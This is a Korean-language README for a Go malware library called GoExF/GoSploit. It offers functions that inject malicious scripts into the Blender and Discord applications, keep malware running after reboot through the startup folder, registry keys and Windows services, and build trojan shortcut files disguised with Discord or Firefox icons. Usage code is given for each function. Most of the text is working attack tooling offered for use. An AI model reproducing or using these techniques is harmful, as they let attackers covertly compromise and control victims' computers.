# 설치 #
`go get github.com/F-r-o-i-d/GoExF/

# 선적 서류 비치
🔴 -> 관리자 필요
🟢 -> 관리자가 필요하지 않음

⚫ -> 대상에 표시
⚪ -> 대상에게 보이지 않음

## 코드 주입
**대상 컴퓨터에서 코드를 실행합니다. **

`github.com/F-r-o-i-d/GoExF/GoExF/GoSploit/InfectApp`

#### - `InfectApp.InfectBlender(` *페이로드(Payload)* ` )` [🔴⚪]

블렌더 코드에 악성 스크립트(배치) 주입 
### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit/InfectApp"

func main(){
	InfectApp.InfectBlender("start calc.exe")
}
```
___
#### - `InfectApp.InfectDiscord(` *페이로드(Payload)* ` )` [🟢⚪]

디스코드 코드에 악성 스크립트(nodejs) 주입 

### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit/InfectApp"

func main(){
	InfectApp.InfectDiscord("while(true){}") // stuck discord on loading
}

```
___
## 고집
**악의적인 프로그램을 대상 시스템에 고정시킵니다. **

`github.com/GoExF/GoExF/GoSploit`

#### - `GoSploit.StartUpWdirectories()`[🟢⚫]

copy evil .exe -> shell:startup

### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit"

func main(){
	GoSploit.Initialize()
	GoSploit.StartUpWdirectories() 
}
```
___

#### - `GoSploit.StartUpWdregedit()`[🔴⚫]

시작 시 exe를 실행하기 위한 키 regedit 생성

### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit"

func main(){
	GoSploit.Initialize()
	GoSploit.StartUpWdregedit() 
}
```
___
#### - `GoSploit.StartUpWservice(ServiceName)`[🔴⚪]

시작할 때 exe를 실행하는 서비스 만들기 
### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit"

func main(){
	GoSploit.Initialize()
	GoSploit.StartUpWservice() 
}
```
___
## Trojan

**나쁜 파일을 숨겨서 좋은 것처럼 보이도록 만드십시오.**

`import EvilFile "github.com/GoExF/GoExF/GoSploit/EvilFile"`

#### - EvilFile.Lnk [🟢⚫]

```
Discord := EvilFile.EvilLnk{
	Name:        "Discord.lnk",
	Payload:     "evilCode",
	Path:        "$home\\Desktop\\",
	Interface:   "cmd.exe / powershell.exe",
	IconPath:    "Discord.exe path / Discord.ico path",
	Description: "Discord ShortCut",
}
Discord.Build()
```
### ex :
```golang
package main

import "github.com/GoExF/GoExF/GoSploit/EvilFile"

func main(){
	Firefox := EvilFile.EvilLnk{
		Name:        "Firefox.lnk",
		Payload:     "Restart-Computer -Froce",
		Path:        "$home\\Desktop\\",
		Interface:   "powershell.exe",
		IconPath:    "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
		Description: "firefox",
	}
	Firefox.Build()
}
```
